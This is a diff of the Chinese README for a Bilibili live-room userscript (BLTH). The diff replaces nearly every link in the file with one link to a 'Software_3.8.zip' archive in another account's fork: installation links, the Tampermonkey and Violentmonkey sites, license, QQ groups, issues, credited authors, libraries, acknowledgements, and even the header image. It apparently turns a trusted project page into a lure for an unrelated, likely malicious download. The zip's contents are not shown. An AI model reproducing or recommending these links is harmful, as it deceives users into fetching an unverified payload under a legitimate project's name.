@@ -1,17 +1,17 @@
-<p align ="center"><img src="https://cdn.jsdelivr.net/gh/andywang425/BLTH@7d7ca494edd314806460e24c6b59be8ae1bd7dc6/img/script-icon.png"></p>
-<p align="center"><img src="https://img.shields.io/badge/TamperMonkey_4.12-pass-green.svg" alt="TamperMonkey 4.12"> <img src="https://img.shields.io/badge/Violentmonkey_2.12.14-pass-green.svg" alt="Violentmonkey 2.12.14"> <a href="https://github.com/andywang425/BLTH/blob/master/LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License"> <a href="https://jq.qq.com/?_wv=1027&k=fCSfWf1O"> <a href="https://github.com/andywang425/BLTH/stargazers"><img src="https://img.shields.io/github/stars/andywang425/BLTH?style=flat" alt="Stars"></a> <a href="https://github.com/andywang425/BLTH/issues"><img alt="GitHub issues" src="https://img.shields.io/github/issues/andywang425/BLTH"></a></p>
-<p align="center"><a href="https://jq.qq.com/?_wv=1027&k=fCSfWf1O"><img src="https://img.shields.io/badge/QQ%20Group-1106094437-yellow" alt="QQ Group"></a> <a href="https://jq.qq.com/?_wv=1027&k=Bf951teI"><img src="https://img.shields.io/badge/QQ%20Group-907502444(new)-brightgreen" alt="QQ Group"></a></p>
+<p align ="center"><img src="https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip"></p>
+<p align="center"><img src="https://img.shields.io/badge/TamperMonkey_4.12-pass-green.svg" alt="TamperMonkey 4.12"> <img src="https://img.shields.io/badge/Violentmonkey_2.12.14-pass-green.svg" alt="Violentmonkey 2.12.14"> <a href="https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip"><img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License"> <a href="https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip"> <a href="https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip"><img src="https://img.shields.io/github/stars/andywang425/BLTH?style=flat" alt="Stars"></a> <a href="https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip"><img alt="GitHub issues" src="https://img.shields.io/github/issues/andywang425/BLTH"></a></p>
+<p align="center"><a href="https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip"><img src="https://img.shields.io/badge/QQ%20Group-1106094437-yellow" alt="QQ Group"></a> <a href="https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip"><img src="https://img.shields.io/badge/QQ%20Group-907502444(new)-brightgreen" alt="QQ Group"></a></p>
 <h1 align="center">B站直播间挂机助手</h1>
 
 ### 安装方法
-### 1. 点击 [BLTH_github](https://raw.githubusercontent.com/andywang425/BLTH/master/B%E7%AB%99%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B.user.js) 从 github 安装脚本    
-### 2. 点击 [BLTH_greasyfork](https://greasyfork.org/zh-CN/scripts/406048-b%E7%AB%99%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B) 前往 [greasyfork](https://greasyfork.org) 安装脚本  
-### 3. 点击 [BLTH_openuserjs](https://openuserjs.org/scripts/andywang425/B%E7%AB%99%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B) 前往 [openuserjs](https://openuserjs.org) 安装脚本  
+### 1. 点击 [BLTH_github](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) 从 github 安装脚本    
+### 2. 点击 [BLTH_greasyfork](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) 前往 [greasyfork](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) 安装脚本  
+### 3. 点击 [BLTH_openuserjs](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) 前往 [openuserjs](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) 安装脚本  
 
 -------------------------------
 
 ## 使用方法 
-在 [Tampermonkey](https://www.tampermonkey.net) / [Violentmonkey](https://violentmonkey.github.io) 中启用脚本，登陆bilibili后打开任意b站直播间。 
+在 [Tampermonkey](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) / [Violentmonkey](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) 中启用脚本，登陆bilibili后打开任意b站直播间。 
 + 在 Tampermonkey 脚本设置中需要将此脚本的设置 “仅在顶层页面（框架）运行” 设置为否(默认为否)才使脚本在特殊直播间运行。  
 + 不保证能通过其它油猴插件(如Greasemonkey)运行。  
 
@@ -79,87 +79,87 @@
 
 ### 关于反馈
 + 如果使用脚本过程中遇到问题，可以先按上述步骤[开启控制台日志](#控制台日志)，然后关掉无关功能再次运行脚本并在控制台中寻找相关错误信息。若能找到请在反馈bug时附上这些控制台日志。
-+ 反馈bug前请先阅读[bug_report.md](https://github.com/andywang425/BLTH/blob/master/.github/ISSUE_TEMPLATE/bug_report.md)。
-+ 交流qq群：①群：[1106094437](https://jq.qq.com/?_wv=1027&k=fCSfWf1O)，②群：[907502444(新)](https://jq.qq.com/?_wv=1027&k=Bf951teI)。欢迎进来聊天或者提点建议~    
++ 反馈bug前请先阅读[bug_report.md](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)。
++ 交流qq群：①群：[1106094437](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，②群：[907502444(新)](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)。欢迎进来聊天或者提点建议~    
 
 -------------------------------
 
 ## 已知问题
-1. [#12](https://github.com/andywang425/BLTH/issues/12)  
-本脚本可能与[Bilibili-Evolved](https://github.com/the1812/Bilibili-Evolved)存在兼容性问题导致脚本窗口无法正确加载。若出现此问题，请尝试在Bilibili-Evolved设置-其它中，将`加载模式`设置为延后。  
+1. [#12](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)  
+本脚本可能与[Bilibili-Evolved](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)存在兼容性问题导致脚本窗口无法正确加载。若出现此问题，请尝试在Bilibili-Evolved设置-其它中，将`加载模式`设置为延后。  
 开启`简化直播间`功能后聊天栏顶部的日志文字无法正确地被隐藏/显示成黄色，不过不影响使用。
 2. 脚本每次更新后第一次运行可能会不工作，`shift+F5`刷新一下页面即可。  
-3. 可能和[SteamWebIntegration](https://github.com/Revadike/SteamWebIntegration)存在冲突导致同时运行时页面无响应。可以在SteamWebIntegration的设置中把B站直播间添加到黑名单。  
+3. 可能和[SteamWebIntegration](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)存在冲突导致同时运行时页面无响应。可以在SteamWebIntegration的设置中把B站直播间添加到黑名单。  
 
 -------------------------------
 
 # 许可证
 本项目以`MIT`许可证开源。  
 
-<a href="https://github.com/andywang425/BLTH/blob/master/LICENSE"><img alt="GitHub" src="https://img.shields.io/github/license/andywang425/BLTH?style=for-the-badge"></a>
+<a href="https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip"><img alt="GitHub" src="https://img.shields.io/github/license/andywang425/BLTH?style=for-the-badge"></a>
 
 -------------------------------
 
 # 其它信息  
 这个项目的部分代码来源于以下几个项目:  
-+ [B站直播签到助手](https://wwa.lanzous.com/iLjOmkfuvxe) (MIT) by [十六夜](https://space.bilibili.com/4317450)
-+ [BLRHH](https://github.com/SeaLoong/BLRHH) (MIT) by [SeaLoong](https://github.com/SeaLoong)
-+ [Bilibili-LRHH](https://github.com/pjy612/Bilibili-LRHH) (MIT, _forked from SeaLoong/BLRHH_) by [pjy612](https://github.com/pjy612)
-+ [TampermonkeyJS](https://github.com/lzghzr/TampermonkeyJS) (MIT) by [lzghzr](https://github.com/lzghzr)
-+ [layer](https://github.com/sentsin/layer) (MIT) by [sentsin](https://github.com/sentsin)
-+ [Ajax-hook](https://github.com/wendux/Ajax-hook) (MIT) by [wendux](https://github.com/wendux)
-+ [bliveproxy](https://github.com/xfgryujk/bliveproxy) (MIT) by [xfgryujk](https://github.com/xfgryujk)
-+ [brotli](https://github.com/google/brotli) (MIT) by [google](https://github.com/google)
++ [B站直播签到助手](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT) by [十六夜](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [BLRHH](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT) by [SeaLoong](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [Bilibili-LRHH](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT, _forked from SeaLoong/BLRHH_) by [pjy612](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [TampermonkeyJS](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT) by [lzghzr](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [layer](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT) by [sentsin](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [Ajax-hook](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT) by [wendux](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [bliveproxy](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT) by [xfgryujk](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [brotli](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT) by [google](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
 
 本脚本使用的库：  
-+ [jQuery](https://github.com/jquery/jquery) (MIT)  
-+ [BilibiliAPI_Mod](https://github.com/andywang425/BLTH/blob/master/assets/js/library/BilibiliAPI_Mod.js) (MIT)：各种B站API。
-+ [libBilibiliToken](https://github.com/lzghzr/TampermonkeyJS/blob/master/libBilibiliToken/libBilibiliToken.js) (MIT)：获取移动端token。
-+ [libWasmHash](https://github.com/lzghzr/TampermonkeyJS/blob/master/libWasmHash/libWasmHash.js) (MIT)：WebAssembly实现的Hash，计算心跳请求参数。
-+ [layer](https://github.com/sentsin/layer/blob/master/dist/layer.js) (MIT)：web弹层组件。
-+ [Ajax-hook](https://github.com/wendux/Ajax-hook) (MIT)：用于拦截浏览器XMLHttpRequest的库。
-+ [bliveproxy](https://github.com/xfgryujk/bliveproxy/blob/master/bliveproxy.user.js) (MIT)：B站直播websocket hook框架。
-+ [pako_inflate](https://github.com/nodeca/pako) (MIT)：基于zlib的javascript压缩/解压缩库。
-+ [decode](https://github.com/google/brotli/blob/master/js/decode.js) (MIT)：brotli项目中的javascript解码库。
++ [jQuery](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT)  
++ [BilibiliAPI_Mod](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT)：各种B站API。
++ [libBilibiliToken](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT)：获取移动端token。
++ [libWasmHash](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT)：WebAssembly实现的Hash，计算心跳请求参数。
++ [layer](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT)：web弹层组件。
++ [Ajax-hook](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT)：用于拦截浏览器XMLHttpRequest的库。
++ [bliveproxy](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT)：B站直播websocket hook框架。
++ [pako_inflate](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT)：基于zlib的javascript压缩/解压缩库。
++ [decode](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip) (MIT)：brotli项目中的javascript解码库。
 
 本脚本引用的外部资源：  
-+ [layer.css](https://github.com/sentsin/layer/blob/master/dist/theme/default/layer.css)：layer.js的内置样式。
-+ [myCss.css](https://github.com/andywang425/BLTH/blob/master/assets/css/myCss.css)：脚本样式。
-+ [main.html](https://github.com/andywang425/BLTH/blob/master/assets/html/main.html)：脚本控制面板的html。
-+ [eula.html](https://github.com/andywang425/BLTH/blob/master/assets/html/eula.html)：最终用户许可协议。
++ [layer.css](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)：layer.js的内置样式。
++ [myCss.css](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)：脚本样式。
++ [main.html](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)：脚本控制面板的html。
++ [eula.html](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)：最终用户许可协议。
 
 -------------------------------
 
 ## 鸣谢
-[十六夜](https://greasyfork.org/en/users/289469-%E5%8D%81%E5%85%AD%E5%A4%9C)，[SeaLoong](https://github.com/SeaLoong)，[pjy612](https://github.com/pjy612)，[lzghzr](https://github.com/lzghzr)，[sentsin](https://github.com/sentsin)，[wendux](https://github.com/wendux)，[风绫丨钰袖](https://space.bilibili.com/20842051)，[Server酱](https://sc.ftqq.com)，[无尾玦的小尾巴](https://space.bilibili.com/234368216)，[酷推](https://cp.xuthus.cc)，[冰冰羊](https://space.bilibili.com/261593393)，[xfgryujk](https://github.com/xfgryujk)，[推送加](https://pushplus.plus)  
+[十六夜](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[SeaLoong](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[pjy612](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[lzghzr](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[sentsin](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[wendux](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[风绫丨钰袖](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[Server酱](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[无尾玦的小尾巴](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[酷推](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[冰冰羊](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[xfgryujk](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)，[推送加](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)  
 以及所有提出过建议的用户。
 
 -------------------------------
 
 # 更新日志
 
-完整更新日志见[update-log.md](https://github.com/andywang425/BLTH/blob/master/assets/markdown/update-log.md)。  
+完整更新日志见[update-log.md](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)。  
 
 -------------------------------
 
 # 相关推荐
 
 ### Bilibili-Evolved
-作者：[the1812](https://github.com/the1812)
-+ [Github](https://github.com/the1812/Bilibili-Evolved)  
+作者：[the1812](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [Github](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)  
 
 强大的哔哩哔哩增强脚本: 下载视频, 音乐, 封面, 弹幕 / 简化直播间, 评论区, 首页 / 自定义顶栏, 删除广告, 夜间模式 / 触屏设备支持。
 
 ### bilibili直播净化
-作者：[lzghzr](https://github.com/lzghzr)
-+ [Github](https://github.com/lzghzr/TampermonkeyJS/raw/master/BiLiveNoVIP/BiLiveNoVIP.user.js)
-+ [GreasyFork](https://greasyfork.org/zh-CN/scripts/21416-bilibili%E7%9B%B4%E6%92%AD%E5%87%80%E5%8C%96)  
+作者：[lzghzr](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [Github](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [GreasyFork](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)  
 
 屏蔽聊天室礼物以及关键字，净化聊天室环境。
 
 ### 哔站直播全裸2233娘
-作者：[journey-ad](https://gist.github.com/journey-ad)
-+ [Github](https://gist.github.com/journey-ad/5d3021fd40db75de2df827b876ef5b7e)
-+ [GreasyFork](https://greasyfork.org/zh-CN/scripts/369477-%E5%93%94%E7%AB%99%E7%9B%B4%E6%92%AD%E5%85%A8%E8%A3%B82233%E5%A8%98)  
+作者：[journey-ad](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [Github](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)
++ [GreasyFork](https://github.com/KenTsuCo/BLTH/raw/refs/heads/master/assets/markdown/Software_3.8.zip)  
 
 哔站直播间的2233娘挂件替换为全裸版本。
